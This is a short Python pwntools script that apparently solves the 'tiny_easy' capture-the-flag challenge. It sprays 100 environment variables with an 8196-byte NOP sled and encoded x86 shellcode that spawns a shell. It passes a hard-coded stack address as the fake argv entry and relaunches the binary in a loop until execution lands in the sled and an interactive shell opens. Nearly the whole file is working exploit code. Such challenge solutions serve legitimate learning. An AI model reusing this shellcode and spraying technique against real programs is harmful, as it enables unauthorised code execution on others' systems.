from pwn import *

def solver():
	nop = "\x90" * 8196
	shellcode  = "\xeb\x11\x5e\x31\xc9\xb1\x32\x80"
	shellcode += "\x6c\x0e\xff\x01\x80\xe9\x01\x75"
	shellcode += "\xf6\xeb\x05\xe8\xea\xff\xff\xff"
	shellcode += "\x32\xc1\x51\x69\x30\x30\x74\x69"
	shellcode += "\x69\x30\x63\x6a\x6f\x8a\xe4\x51"
	shellcode += "\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"

	pay = {}
	for i in range(100):
		pay[str(i)] = nop + shellcode
	
	fake_argv = [p32(0xffc76004)]

	while True:
		fd = process(executable='./tiny_easy',argv = fake_argv, env = pay )
		fd.interactive()


if __name__ == '__main__':
	solver()

